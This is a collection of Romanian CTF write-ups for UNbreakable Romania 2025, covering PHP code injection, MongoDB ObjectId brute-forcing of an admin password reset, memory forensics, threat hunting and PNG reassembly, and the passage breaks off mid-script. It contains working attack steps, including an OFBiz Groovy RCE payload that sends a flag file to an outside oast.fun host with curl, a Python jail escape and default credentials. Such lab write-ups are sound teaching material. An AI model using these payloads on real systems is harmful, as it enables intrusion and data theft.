Write-ups pentru UNbreakable Romania 2025

Autor: BRRC
Email: malw_guy
Username pe CyberEDU: malw_guy

### phpwn - web

##### Dovada obtinerii flagului

CTF{f4349967e93964f125623e2832cec93e4d15e1c6b9303cc89bb3f22c2514d77c}

##### Sumar

Blind PHP Code injection intr-un POST

##### Dovada rezolvarii

Conform codului sursa oferit de challenge, trebuie sa dam printr-un parametru de GET `uuid`, un uuidv4 valid, dupa care vom putea trimite date printr-un POST.

```php
$uuid = $_GET['uuid'] ?? '';

  

if (!is_string($uuid) || (preg_match('/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/', $uuid) !== 1)) {

    $uuid = '';

}
```


```php
    echo '<form method="POST">

    <textarea name="content" rows="10" cols="50">' . htmlspecialchars($content) . '</textarea>

    <button type="submit">Save</button>

    </form>';
```

Sanitizarea `htmlspecialchars` nu este suficienta pentru a prevenii code injection. Putem lua RCE prin comenzi executate in backtics.

Totul este posibil din cauza ca urmatoarea functie `setbackup` , scrie ceea ce trimitem prin POST in fisierul `backup.sh`, care ulterior este executat la fiecare minut(conform descrierii challenge-ului).

```php
function setbackup($uuid, $content){

    $raw_json = ['uuid' => $uuid, 'm_threaded' => false, 'supplier' => false, 'initial_content' => $content];

    $json = json_encode($raw_json);

    $json = addslashes($json);

    $output = "echo Backing up user data: \"{$json}\";\n";

    $output .= "cp /var/www/html/data/$uuid /backup/;\n\n";

    file_put_contents('/var/www/html/private/backup.sh', $output, FILE_APPEND);

}
```

Ca si payload, din cauza ca e blind am ales sa exfiltrez flag-ul printr-un fisier local, care sa-l pot accesa din web.

![[Pasted image 20250413151825.png]]

![[Pasted image 20250413151841.png]]




### stolen-data - mobile

##### Dovada obtinerii flagului

CTF{9a4477c0b485e0427c177e1b4274df935f3bc867e537aae5bd54e0b22ea71eb1}

##### Sumar 

Un bruteforce mai "destept" la `userID`-ul adminului prin [mongoid](https://www.mongodb.com/docs/manual/reference/method/ObjectId/)

##### Dovada rezolvarii

Conform apk-ului primit, la analiza statica cu `jadx`, am descoperit urmatoarele endpoint-uri 

![[Pasted image 20250413153504.png]]
la functia de `RegisterRequest`, putem observa campurile necesare pentru intregistrare

![[Pasted image 20250413153557.png]]

Iar acestea le putem replica in `Burpsuite`

![[Pasted image 20250413153630.png]]

In raspuns, observam 2 lucruri: 

> token (cookie-ul folosit pentru a folosii aplicatia)

> id (un string de 12 bytes, care initial pare generat random)

Conform [documentatiei online](https://www.mongodb.com/docs/manual/reference/method/ObjectId/), acel id este generat astfel: 

*Returns a new [ObjectId](https://www.mongodb.com/docs/manual/reference/bson-types/#std-label-objectid). The 12-byte [ObjectId](https://www.mongodb.com/docs/manual/reference/bson-types/#std-label-objectid) consists of:-*

- *A 4-byte timestamp, representing the ObjectId's creation, measured in seconds since the Unix epoch.*
- *A 5-byte random value generated once per process. This random value is unique to the machine and process.*
- *A 3-byte incrementing counter, initialized to a random value.*

![[Pasted image 20250413154740.png]]

La inca un cont facut, la scurt timp dupa precedentul, putem observa ca `id`-ul difera, dar putin. 

Stim ca exista un admin pe platforma, iar pe endpoint-ul de change-password `/api/auth/change-password`, putem vedea ca are nevoie doar de 2 campuri

![[Pasted image 20250413155003.png]]

`newPassword` si `userId`, nici macar autentificati nu trebuie sa fim ca sa putem face request-ul.

Cu urmatorul script, ne putem genera un wordlist de id-uri, care se afla in apropierea noastra ca si timestamp


```python
import datetime

import time

import sys

  

def is_valid_object_id(id_str):

    if len(id_str) != 24:

        return False

    try:

        int(id_str, 16)

        return True

    except ValueError:

        return False

  

def generate_object_ids(reference_id, timestamp_range_seconds=60, max_ids=1000, output_file="generated_ids.txt"):

    if not is_valid_object_id(reference_id):

        print(f"[-] Invalid reference_id format: {reference_id}")

        return

    timestamp_hex = reference_id[0:8]

    machine_id = reference_id[8:14]

    pid = reference_id[14:18]

    counter_hex = reference_id[18:24]

    timestamp_int = int(timestamp_hex, 16)

    counter_int = int(counter_hex, 16)

    base_time = datetime.datetime.fromtimestamp(timestamp_int)

    print(f"[*] Reference ObjectId info - Time: {base_time}, Counter: {counter_int}")

    with open(output_file, 'w') as f:

        id_count = 0

        for offset in range(0, -timestamp_range_seconds - 1, -1):

            if id_count >= max_ids:

                break

            current_time = base_time + datetime.timedelta(seconds=offset)

            current_timestamp = int(current_time.timestamp())

            current_timestamp_hex = format(current_timestamp, '08x')

            for counter in range(counter_int, counter_int - 100, -1):

                if counter < 0 or id_count >= max_ids:

                    break

                counter_hex = format(counter, '06x')

                new_id = current_timestamp_hex + machine_id + pid + counter_hex

                f.write(f"{new_id}\n")

                id_count += 1

        for offset in range(1, timestamp_range_seconds + 1):

            if id_count >= max_ids:

                break

            current_time = base_time + datetime.timedelta(seconds=offset)

            current_timestamp = int(current_time.timestamp())

            current_timestamp_hex = format(current_timestamp, '08x')

            for counter in range(0, 100):

                if id_count >= max_ids:

                    break

                counter_hex = format(counter, '06x')

                new_id = current_timestamp_hex + machine_id + pid + counter_hex

                f.write(f"{new_id}\n")

                id_count += 1

    print(f"[+] Generated {id_count} ObjectIDs to {output_file}")

  

def main():

    if len(sys.argv) < 2:

        print("Usage: python generate.py <reference_objectid> [time_range_seconds] [max_ids] [output_file]")

        print("Example: python generate.py 60f1a5d7e6b3f1c832a88d9e 30 1000 ids.txt")

        return

    reference_id = sys.argv[1]

    time_range = int(sys.argv[2]) if len(sys.argv) > 2 else 60

    max_ids = int(sys.argv[3]) if len(sys.argv) > 3 else 65536

    output_file = sys.argv[4] if len(sys.argv) > 4 else "generated_ids.txt"

    print(f"[*] Generating ObjectIDs based on: {reference_id}")

    print(f"[*] Time range: ±{time_range} seconds")

    print(f"[*] Maximum IDs: {max_ids}")

    print(f"[*] Output file: {output_file}")

    generate_object_ids(reference_id, time_range, max_ids, output_file)

  

if __name__ == "__main__":

    main()
```

Comanda folosita pentru a rula scriptul: 

```bash
python3 generate.py 67fa6f87aab996bcb6bb0107 300 65530 admin_ids.txt
```


Unde id-ul `67fa6f87aab996bcb6bb0107` este id-ul contului meu, pentru ca vrem sa plecam de la el in spate ca si timestamp. 

Aici am plecat in spate cu 300 de secunde, si am vrut 65530 de id-uri, ca totul sa mearga mai rapid, cu request-urile deja scrise pentru register, am dat restart la masina, ca sa fie timestamp-ul de la admin cat mai aproape posibil.

Comanda va genera un wordlist de aprox 1,5 mb, acesta il vom folosii cu burpsuite pentru brute force. Am optat pentru aceasta metoda din cauza ca am Burpsuite Pro si nu am rate limit la intruder. 

![[Pasted image 20250413160247.png]]![[Pasted image 20250413160518.png]]

Aici putem vedeam la `Status Code` ca avem un 200, deci o parola a fost schimbata cu succes. 

Dupa asta, le logam cu email-ul `admin@inovative.notes`, email gasit dupa instalarea .apk-ului pe mobil, la sectiunea de informatii, si parola setata de noi. 

Dupa care navigam pe `/api/notes`

![[Pasted image 20250413160652.png]]


### hangman - misc

##### Dovada obtinerii flagului

ctf{609e75158367c10d4bd189db41206dbdde4d1c542279ea5275bbcdf440af7509}

##### Sumar

Dupa ce ghicim o litera, putem sa o dam ca input aceasi litera, pana cand avem lungimea cuvantului

##### Dovada rezolvarii

![[Pasted image 20250413161828.png]]

Aici se poate observa cum am ghicit litera `b`, si am dat ca input tot `b` pana cand am introdus suficienti `b` cat sa fie cat lungimea cuvantului pe care trebuie sa-l ghices, iar dupa aceasta ne-a dat flagul.







### jvroom - forensics

#### Q1. What version of OS build is present?

```
python3 vol.py -f memdump.mem windows.info
```

Output: 

```
Variable        Value

Kernel Base     0xf80566c1e000
DTB     0x1aa000
Symbols file:///usr/local/lib/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/167FE94B5641C005AC3036212A01F8DC-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 FileLayer
KdVersionBlock  0xf8056782d420
Major/Minor     15.19041
MachineType     34404
KeNumberProcessors      4
SystemTime      2025-04-04 09:58:32+00:00
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine      34404
PE TimeDateStamp        Tue Sep 26 06:53:33 2023
```

De la `Major/Minor     15.19041` putem vedea ca build-ul nostru e `19041`


#### Q2. What is the PID of the text viewing program?


```
python3 vol.py -f memdump.mem windows.pslist
```

Output:

```
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output
.
.
.
.
5840    5748    explorer.exe    0x9d032794d080  65      -       1       False   2025-04-04 09:46:41.000000 UTC  N/A     Disabled
5624    752     svchost.exe     0x9d0327a86340  6       -       1       False   2025-04-04 09:46:44.000000 UTC  N/A     Disabled
6316    900     StartMenuExper  0x9d0327ce8080  8       -       1       False   2025-04-04 09:46:48.000000 UTC  N/A     Disabled
6644    900     RuntimeBroker.  0x9d0327e390c0  1       -       1       False   2025-04-04 09:46:50.000000 UTC  N/A     Disabled
6880    900     SearchApp.exe   0x9d0327e08080  55      -       1       False   2025-04-04 09:46:52.000000 UTC  N/A     Disabled
7080    900     RuntimeBroker.  0x9d0328367340  7       -       1       False   2025-04-04 09:46:54.000000 UTC  N/A     Disabled
7296    5840    notepad.exe     0x9d03283d1300  1       -       1       False   2025-04-04 09:47:05.000000 UTC  N/A     Disabled
8360    5840    SecurityHealth  0x9d03287680c0  6       -       1       False   2025-04-04 09:47:09.000000 UTC  N/A     Disabled
8628    5840    VBoxTray.exe    0x9d0328646240  11      -       1       False   2025-04-04 09:47:11.000000 UTC  N/A     Disabled
8796    752     SecurityHealth  0x9d0328898280  17      -       0       False   2025-04-04 09:47:11.000000 UTC  N/A     Disabled
8848    5840    OneDrive.exe    0x9d0328642240  23      -       1       False   2025-04-04 09:47:11.000000 UTC  N/A     Disabled
.
.
.
```


De aici putem observa executabilul `notepad.exe` in lista de procese, prima coloana este PID-ul(numarul procesului). De aici luam raspunsul

`7296`

#### Q3. What is the parent process name of the text viewing program ?


```
python3 vol.py -f memdump.mem windows.pslist
```

Output:

```
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output
.
.
.
.
5840    5748    explorer.exe    0x9d032794d080  65      -       1       False   2025-04-04 09:46:41.000000 UTC  N/A     Disabled
5624    752     svchost.exe     0x9d0327a86340  6       -       1       False   2025-04-04 09:46:44.000000 UTC  N/A     Disabled
6316    900     StartMenuExper  0x9d0327ce8080  8       -       1       False   2025-04-04 09:46:48.000000 UTC  N/A     Disabled
6644    900     RuntimeBroker.  0x9d0327e390c0  1       -       1       False   2025-04-04 09:46:50.000000 UTC  N/A     Disabled
6880    900     SearchApp.exe   0x9d0327e08080  55      -       1       False   2025-04-04 09:46:52.000000 UTC  N/A     Disabled
7080    900     RuntimeBroker.  0x9d0328367340  7       -       1       False   2025-04-04 09:46:54.000000 UTC  N/A     Disabled
7296    5840    notepad.exe     0x9d03283d1300  1       -       1       False   2025-04-04 09:47:05.000000 UTC  N/A     Disabled
8360    5840    SecurityHealth  0x9d03287680c0  6       -       1       False   2025-04-04 09:47:09.000000 UTC  N/A     Disabled
8628    5840    VBoxTray.exe    0x9d0328646240  11      -       1       False   2025-04-04 09:47:11.000000 UTC  N/A     Disabled
8796    752     SecurityHealth  0x9d0328898280  17      -       0       False   2025-04-04 09:47:11.000000 UTC  N/A     Disabled
8848    5840    OneDrive.exe    0x9d0328642240  23      -       1       False   2025-04-04 09:47:11.000000 UTC  N/A     Disabled
.
.
.
```

Din output ul comenzii trecute, putem observa si PPID-ul prcesului (parent PID), iar de aici observam ca parintele procesului `notepad.exe`, este procesul cu pid-ul `5840`, deci `explorer.exe`.


#### Q4. What is the number of characters for the command that opens the important file?

```
python3 vol3.py -f memdump.mem windows.cmdline
```

Output:

```
.
.
.
7296    notepad.exe     "C:\Windows\system32\NOTEPAD.EXE" C:\Users\elasticuser\Desktop\toyota.txt
.
.
.
```

De aici, numaram caracterele comenzii 

`"C:\Windows\system32\NOTEPAD.EXE" C:\Users\elasticuser\Desktop\toyota.txt` sunt 73 de caractere

#### Q5. Tool that can be used to work with a hex dump

Aici nu a fost nevoie de vreo investigatie asupra memdump-ului, am vazut ca formatul este din 3 caractere `XXX`, deci am mers instant pe raspunsul corect: `xxd`

#### Q6.What car manufacturer is being compromised?

Conform si fisierului gasit anterior `toyota.txt`, putem spune ca `Toyota` este firma de masini compromisa.

#### Q7. What is the decoded information that was stolen ?

```
stringss memdump.mem | grep toyota
```

Output: 

```
ECB32AF3-1440-4086-94E3-5311F97F89C4\{ThisPCDesktopFolder}\toyota.txt
ECB32AF3-1440-4086-94E3-5311F97F89C4\{ThisPCDesktopFolder}\toyota.txt
key to open my toyota supra is , i think ....
toyota key is dzFOZDBXNV93MVRoX2YwUmRfcjRN
toyota key is dzFOZDBXNV93MVRoX2YwUmRfcjRN
toyota key is dzFOZDBXNV9
toyota key is dzFOZDBXNV7=
toyota key is dzFOZDB
```

Aici gasim informatia furata `toyota key is dzFOZDBXNV93MVRoX2YwUmRfcjRN`, unde `dzFOZDBXNV93MVRoX2YwUmRfcjRN` decoded din base64 este `w1Nd0W5_w1Th_f0Rd_r4M`

#### Q8. From which car model was the key stolen?

```
stringss memdump.mem | grep toyota
```

Din output-ul comenzii trecute putem observa: 

`key to open my toyota supra is , i think ....`

Ca modelul masinii de care este vorba este `Toyota Supra`


#### Q9. At which hexadecimal memory location (32 bytes aligned) can the car model be found?


```
xxd memdump.mem | grep supra
```

Output: 

```
0a770c40: 7375 7072 616f 7264 696e 617a 6168 7324  supraordinazahs$
114ec150: 7974 7465 6e5c 7375 7072 616d 6178 696c  ytten\supramaxil
14264300: 6e64 736f 706c 7973 f931 7375 7072 616f  ndsoplys.1suprao
15f9aef0: 617a 616d 2073 7570 7261 6f72 6469 6e61  azam supraordina
1a7c1f90: f3ac 0580 0812 6967 7374 2073 7570 7261  ......igst supra
216c2700: 1267 656c 7365 255c 7375 7072 6161 7464  .gelse%\supraatd
264d6c10: 7375 7072 616f 7264 696e 6172 7973 0068  supraordinarys.h
283e9630: 125c 7375 7072 616d 6178 6e65 7474 796b  .\supramaxnettyk
2f86bf60: 6f79 6f74 6120 7375 7072 6120 6973 202c  oyota supra is ,
36f93640: 6273 6b79 7474 656e 5c73 7570 7261 6d61  bskytten\suprama
```

De aici putem observa urmatoarea linie: 

```
2f86bf60: 6f79 6f74 6120 7375 7072 6120 6973 202c  oyota supra is ,
```

Si aici avem locatie de memorie `2f86bf60`



### malware chousa - threat hunting

#### Q1. What .bat file is the source of infection?

![[Pasted image 20250413210435.png]]

Din registrii, cand am verificat pentru persistenta, am gasit si fisierul `start.bat` de la care a inceput infectia.

#### Q2. What Windows Logs file from EventViewer contains information about creation of users?

Intrebare teoretica, raspunsul este `Security`

#### Q3. What new user was created by malware?

Avand in vedere ca log-urile noastre se afla in fisierl `log.evtx`, id-ul unei creeari de user este `4720`, deci dupa ce filtram logurile dupa id-ul 4720, gasim user-ul creat

![[Pasted image 20250413202909.png]]

Din poza se poate observa ca user-ul nou creat este `artifact`

#### Q4. What is the extension of the encrypted files

Am dat mount la filesystem-ul oferit de challenge `image.ad1` folosind FTK Imager, explorand file system-ul, am gasit niste sample-uri de fisiere criptate

![[Pasted image 20250413211415.png]]


#### Q5. From what IP is backdoor downloaded?

Filtram pcap-ul dupa protocolul `http`, si putem vedea doar un request, si un raspuns

![[Pasted image 20250413203101.png]]

`GET /backdoor` este initiata de victima, deci backdoor-ul este descarcat de pe IP-ul `192.168.100.47`


#### Q6. What registry is used for persistence? (see registry.reg)

Avand in vedere ca avem deaface cu persistenta, putem spune ca trebuie sa ne uitam intr-un registry key de `/Run` 

![[Pasted image 20250413210405.png]]

Aici gasim si raspunsul la Q1, `start.bat`

Deci, raspunsul este `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

#### Q7. Path of the Powershell history file

Asa cum e de regula, PS History-ul se afla in `AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\

La imaginea `image.ad1` am dat mount la filesystem folosind FTK Imager, si am navigat la acel path, si am gasit history-ul 

![[Pasted image 20250413211023.png]]

Ca si path final, avem `C:\Users\atomi\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

#### Q8 Enter the flag

Deschidem fisierul de powershell history, si acolo vom gasi flag-ul 

```
Clear-History
curl http://c2implant.com/flag=CTF{u4vz7r1yq2t9x0p8w5j3k7m6l2c1n0z}
cat 'C:\Users\atomi\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt'
```

Deci, flag-ul este `CTF{u4vz7r1yq2t9x0p8w5j3k7m6l2c1n0z}`



### keep-it-locked - forensics

##### Dovada obtinerii flagului

UNR{n0_p@ss0rd_man@g3r_can_KEE_m3_0ut}

##### Sumar

Analizand memory dump-ul, observam ca se foloseste KeePass Password Manager, pe desktop gasim database-ul folosit de acesta, mai gasim si parola db-ului folosita ca si linie de comanda. Folosind acestea decriptam db-ul si luam flag-ul din el.

##### Dovada rezolvarii

```bash
python3 vol.py -f dump_new.raw windows.dumpfiles
```

Output: 

```
.
.
.
DataSectionObject      0xdc84d2f991b0  Database.kbdx    file.0xdc84d2f991b0.0xdc84d2a24010.ImageSectionObject.Database.kbdxl.dat
.
.
.
```

Aici gasim Database-ul de la KeePass, acum trebuie sa-l descarcam.

```
python3 vol.py -f dump_new.raw windows.dumpfiles.DumpFiles --dump --virtaddr 0xdc84d2f991b0
```

Dupa ce l-am descarcat, mai trebuie sa gasim Master Key-ul de la database

```bash
python3 vol.py -f dump_new.raw windows.console 
```

Output: 

```
.
.
.
Database             : C:\Users\windows\Desktop\Database.kdbx
KeyType              : KcpPassword
KeePassVersion       : 2.58.0.0
ProcessID            : 1004
ExecutablePath       : C:\Program Files\KeePass Password Safe 2\KeePass.exe
EncryptedBlobAddress : 53811088
EncryptedBlob        : F0-97-D4-DB-0F-87-81-C3-9A-1D-BE-2D-A9-91-2B-A3-69-F9-58-30-E1-52-83-69-ED-E4-4B-18-23-81-A2-D1
EncryptedBlobLen     : 32
PlaintextBlob        : 74-30-6D-61-74-30-50-6F-74-40-74-6F-53-6F-75-70-31-31-31-00-00-00-00-00-00-00-00-00-00-00-00-00
Plaintext            : t0mat0Pot@toSoup111
PS C:\ProgramData\Release> .\KeeTheft.exe
.
.
.
.
```

De aici putem observa ca parola in plaintext este `t0mat0Pot@toSoup111`


Acuma, putem decripta database-ul cu KeePass

![[Pasted image 20250413214430.png]]

Tot ce mai ramane este sa dam click dreapta pe `Flag` si sa dam `Copy Password`

Si avem flag-ul in clipboard.


### open for business - web

##### Dovada obtinerii flagului

CTF{2378f7c994cd18ee3206f253744aea876734a3ed4e6a7244a9f70f73e86ac833}

##### Sumar

Blacklisted host bypass prin header-ul Host, OFBiz default credentials, si la final reverse shell prin groovy.


##### Dovada rezolvarii

```bash
sudo dirsearch -u https://65.109.131.17:1337/
```

Output:

```
[15:22:04] Starting: 
[15:22:08] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[15:22:09] 400 -  795B  - /a%5c.aspx                                        
[15:22:09] 302 -    0B  - /accounting  ->  /accounting/                     
[15:22:15] 302 -    0B  - /catalog  ->  /catalog/                           
[15:22:16] 302 -    0B  - /common  ->  /common/                             
[15:22:16] 404 -  762B  - /common/                                          
[15:22:16] 404 -  779B  - /common/config/db.ini                             
[15:22:16] 404 -  780B  - /common/config/api.ini                            
[15:22:16] 302 -    0B  - /content  ->  /content/                           
[15:22:16] 302 -    0B  - /content/debug.log  ->  /content/control/main     
[15:22:16] 302 -    0B  - /content/  ->  /content/control/main              
[15:22:18] 302 -    0B  - /example  ->  /example/                           
[15:22:20] 404 -  762B  - /images/                                          
[15:22:20] 302 -    0B  - /images  ->  /images/                             
[15:22:20] 404 -  768B  - /images/README
[15:22:20] 404 -  769B  - /images/c99.php
[15:22:20] 404 -  769B  - /images/Sym.php                                   
[15:22:28] 302 -    0B  - /solr/  ->  /solr/control/checkLogin/             
[15:22:28] 200 -   21B  - /solr/admin/                                      
[15:22:28] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml   
```

Aici putem vedea ca avem ca si status code 200 si 302 pe unele, navigand pe ele, navigand pe cele cu 302, intampinam urmatoarea eroare

![[Pasted image 20250413222610.png]]

Dam un refresh la pagina, iar din Burp schimbam header-ul de `Host` in 
`Host : 127.0.0.1`

![[Pasted image 20250413222759.png]]

Acuma putem observa ca avem o pagina de login de OFBiz

![[Pasted image 20250413222828.png]]

Cautand pe internet, am gasit credentialele default `admin:ofbiz`, insa butonul de login nu merge, ca incearca sa faca un POST pe `127.0.0.1`. acesta fiind o reflexie de la faptul ca noi am spoofat Host header-ul. 

Dupa ce ne-am uitat in codul sursa al paginii, sa vedem ce date trimite prin POST, reconstruim payload-ul cu credentialele default: 

`USERNAME=admin&PASSWORD=ofbiz&JavaScriptEnabled=N`

![[Pasted image 20250413223459.png]]

Aici putem observa in raspuns, ca se seteaza niste cookie-uri, respectiv: 

`Cookie: JSESSIONID=CBBF95616AEFC8696343A12C1FF814EC.jvm1; OFBiz.Visitor=567216; webtools.securedLoginId=admin`

Explorand, gasim consola de Groovy

![[Pasted image 20250413224459.png]]

De aici, putem lua RCE.

Capturam request-ul in burp, si modificam payload-ul in 

```
groovyProgram=%22curl%20http%3A%2F%2Fohflkbhxfnouaxpqxhac26ztca8kjshds.oast.fun%20--data%20%5C%22%24%7B%27cat%20%2Fhome%2Fctf%2Fflag.txt%27.execute%28%29.text.trim%28%29%7D%5C%22%22.execute%28%29
```

Adica 

```
"curl http://ohflkbhxfnouaxpqxhac26ztca8kjshds.oast.fun --data \"${'cat /home/ctf/flag.txt'.execute().text.trim()}\"".execute()
```

![[Pasted image 20250413230040.png]]



### og-jail - misc

##### Dovada obtinerii flagului

ctf{97829f135832f37a4b3d6176227cf6b96d481d543e6051c0087f24c1cd0881ed}

##### Sumar

Folosim `"__import__('os').system('cat flag.txt')"` ca bypass la restrictii si citim flag-ul.

##### Dovada rezolvarii

![[Pasted image 20250413230403.png]]


### scattered - Network

##### Dovada obtinerii flagului

CTF{28193EAB5B637041AEA835924E8A712476BC88A21A25862B78732AB336BA2F33}

##### Sumar

Extragerea și reconstruirea unui fișier PNG fragmentat din surse binare utilizând markerii FILE:name pentru a identifica și combina toate părțile.

##### Dovada rezolvarii

Conform descrierii challenge-ului "The whole is the sum of its parts", trebuia să găsim și să combinăm părți mai multor fisiere transmise intr-un pcap.
Am analizat fișierul pcap și am observat că acesta conține markeri de tip FILE:nume_fisier:PART#: care delimitează diferite segmente de date. Am folosit această informație pentru a crea un script Python care să extragă și să reconstruiască fișierul original.
In pachetele extrase cu Follow, scriptul caută markeri de tip FILE:nume_fisier:PART0: pentru a găsi primul fragment și determina numele fișierului încorporat. Apoi, continuă să caute și să extragă toate fragmentele subsecvente până la marcajul END.
După extragerea tuturor părților, scriptul verifică validitatea datelor PNG prin verificarea prezentei byte-ilor magici PNG la începutul fișierului.
Pentru a executa scriptul, am folosit comanda:

```
python3 extract_script.py fisier_binar_original -o fisier_iesire.png
```
După extragere, am verificat fișierul rezultat care era un PNG valid. Unele dintre acestea contineau parti din flag, altele "Try Harder" :))
![alt text](extracted_part4.png) 
![alt text](extracted_part1.png) 
![alt text](extracted_part2.png) 
![alt text](extracted_part3.png) 
![alt text](extracted_part5.png) 
![alt text](extracted_part6.png) 
![alt text](extracted_part7.png) 
![alt text](extracted_part8.png)

Scriptul Python utilizat pentru rezolvare are capacitatea de:

A identifica dinamic numele fișierului încorporat
A extrage toate fragmentele de date
A verifica validitatea imaginii PNG rezultate

Script python:
```python
import re
import sys
import argparse
from pathlib import Path

# --- Configuration ---
DEFAULT_OUTPUT_PREFIX = 'extracted_'
# ---

# Regex to find the *first* marker and capture the embedded filename
# Looks for "FILE:", captures anything up to ":", then finds ":PART0:"
first_marker_pattern = re.compile(rb'FILE:(.*?):PART0:')
png_start_magic = b'\x89PNG\r\n\x1a\n'

def extract_png(input_path, output_dir):
    """
    Extracts the PNG data from the fragmented binary file.
    Determines embedded filename and number of parts dynamically.
    """
    print(f"[*] Processing binary file: {input_path}")
    try:
        with open(input_path, 'rb') as f:
            full_data = f.read()
        print(f"[*] Read {len(full_data)} bytes.")
    except FileNotFoundError:
        print(f"[!] Error: Input file '{input_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        sys.exit(1)

    # --- Find the embedded filename using the first marker ---
    match = first_marker_pattern.search(full_data)
    if not match:
        print("[!] Error: Could not find the 'FILE:...:PART0:' marker.")
        print("[!] Cannot determine embedded filename or start extraction.")
        sys.exit(1)

    embedded_filename_bytes = match.group(1)
    try:
        embedded_filename_str = embedded_filename_bytes.decode('utf-8')
        print(f"[*] Found embedded filename marker: {embedded_filename_str}")
    except UnicodeDecodeError:
        print(f"[!] Warning: Embedded filename is not valid UTF-8: {embedded_filename_bytes!r}")
        # Attempt to create a safe filename anyway
        safe_embedded_name = re.sub(rb'[^\w\.\-]', b'_', embedded_filename_bytes).decode('ascii', 'ignore')
        if not safe_embedded_name:
            safe_embedded_name = "unknown_file.png"
        embedded_filename_str = safe_embedded_name
        print(f"[*] Using safe derived filename: {embedded_filename_str}")

    output_path = output_dir / f"{DEFAULT_OUTPUT_PREFIX}{embedded_filename_str}"
    print(f"[*] Target output PNG path: {output_path}")

    # --- Create the main splitter pattern using the found filename ---
    # Escape filename in case it contains regex special characters
    escaped_filename = re.escape(embedded_filename_bytes)
    # Pattern matches "FILE:<filename>:" followed by "PART" + digits OR "END", then ":"
    splitter_pattern = re.compile(rb'FILE:' + escaped_filename + rb':(?:PART\d+|END):')

    # Split the data using the specific marker pattern
    parts = splitter_pattern.split(full_data)
    num_segments_found = len(parts) - 2 # Exclude data before first marker and after last
    print(f"[*] Split data into {len(parts)} array elements ({num_segments_found} data segments expected).")

    # Expected structure:
    # parts[0] = Data before PART0 marker (junk)
    # parts[1] = Data segment 0 (after PART0:, before PART1:/END:)
    # parts[2] = Data segment 1 (after PART1:, before PART2:/END:)
    # ...
    # parts[-1] = Data after END marker (junk)

    if len(parts) < 3: # Need at least: before_PART0, segment_0, after_END
        print(f"[!] Error: Unexpectedly low number of segments ({len(parts)}).")
        print(f"[!] Check if PART0 and END markers for '{embedded_filename_str}' exist.")
        sys.exit(1)

    # Concatenate the relevant PNG data segments (all parts except the first and last)
    png_data = b"".join(parts[1:-1])
    print(f"[*] Concatenated {len(parts[1:-1])} segments into {len(png_data)} bytes.")

    # Basic validation
    if not png_data.startswith(png_start_magic):
        print(f"[!] Warning: Resulting data does not start with PNG magic bytes!")
        print(f"    Expected: {png_start_magic!r}")
        print(f"    Got:      {png_data[:len(png_start_magic)]!r}")
        # Don't exit, maybe it's still recoverable, but flag it.
    else:
        print("[+] PNG magic bytes validated.")

    # Write the extracted data to the output PNG file
    try:
        # Ensure output directory exists
        output_dir.mkdir(parents=True, exist_ok=True)
        print(f"[*] Writing extracted PNG data to: {output_path}")
        with open(output_path, 'wb') as f_out:
            f_out.write(png_data)
        print(f"[*] Successfully created {output_path}")
        return output_path # Return the path for LSB check
    except Exception as e:
        print(f"[!] Error writing output file '{output_path}': {e}")
        return None


def check_lsb(image_path):
    """
    Attempts to reveal hidden data using LSB steganography.
    (Same function as before)
    """
    if not image_path:
        print("[!] Skipping LSB check as extraction failed.")
        return

    print(f"\n[*] Attempting LSB steganography check on: {image_path}")
    try:
        # Import necessary libraries here so script runs even if not installed initially
        from stegano import lsb
        from PIL import Image

        # Ensure the image file exists before trying to open
        if not image_path.is_file():
            print(f"[!] Error: Image file '{image_path}' not found for LSB check.")
            return

        try:
            # Add error handling specific to PIL/stegano opening the file
            try:
                img = Image.open(image_path)
                img.load() # Try to load image data to catch corruption early
            except Exception as img_err:
                 print(f"[!] Error loading image file '{image_path}' with Pillow: {img_err}")
                 print("[!] Cannot perform LSB check.")
                 return

            secret_message = lsb.reveal(image_path) # Use path directly as stegano expects

            if secret_message:
                print(f"[+] LSB check revealed potential data:")
                # Try decoding as UTF-8, but display raw bytes if it fails
                try:
                    # Attempt to decode if it's bytes, otherwise assume string
                    if isinstance(secret_message, bytes):
                        decoded_message = secret_message.decode('utf-8', errors='replace')
                        print(f"    Decoded (UTF-8): {decoded_message}")
                        if decoded_message != secret_message: # Show raw if decoding changed it/failed
                             print(f"    Raw Bytes      : {secret_message!r}")
                    else:
                         print(f"    Decoded (UTF-8): {secret_message}") # Already a string?

                except Exception as decode_err: # Catch potential errors during decode/print
                     print(f"    Error decoding/printing message: {decode_err}")
                     print(f"    Raw Data       : {secret_message!r}")

                print(f"\n[*] If this looks like the flag, congratulations!")
                print(f"[*] If not, or if it's empty/garbled, you might need more advanced tools.")

            else:
                print(f"[*] LSB check (stegano library) did not find any hidden data.")

        except Exception as e:
            print(f"[!] Error during LSB check with stegano: {e}")
            print(f"[!] The image might be corrupted, or stegano doesn't support this specific format/method.")

        print(f"\n[*] Recommendation: Try a more comprehensive tool like 'zsteg'")
        print(f"    Run this in your terminal: zsteg \"{image_path}\"") # Add quotes for paths with spaces

    except ImportError:
        print("[!] Error: 'stegano' or 'Pillow' library not found.")
        print("[!] Please install them: pip install stegano Pillow")
    except Exception as e:
        print(f"[!] An unexpected error occurred during LSB check setup: {e}")


# --- Main Execution ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Extracts PNG files fragmented with FILE:<name>:PARTX: markers."
    )
    parser.add_argument(
        "input_bin_file",
        type=Path,
        help="Path to the input binary file containing the fragmented PNG."
    )
    parser.add_argument(
        "-o", "--output-dir",
        type=Path,
